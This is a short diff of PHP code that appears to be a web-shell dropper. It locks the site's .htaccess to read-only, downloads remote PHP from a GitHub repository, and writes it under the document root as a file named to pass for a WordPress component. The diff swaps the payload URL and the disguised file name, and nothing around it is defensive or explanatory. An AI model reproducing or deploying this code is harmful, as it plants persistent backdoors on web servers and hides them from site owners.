@@ -12,8 +12,8 @@ $locall=$_SERVER['DOCUMENT_ROOT']."/cgi-et/.htaccess";
 if(file_put_contents($locall, $filee));  
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/.htaccess", 0444);
 
-$file = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/und.php');
-$local=$_SERVER['DOCUMENT_ROOT']."/cgi-et/wp-supports.php";
+$file = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/nt');
+$local=$_SERVER['DOCUMENT_ROOT']."/cgi-et/wp-irealto.php";
 if(file_put_contents($local, $file));   
 
 
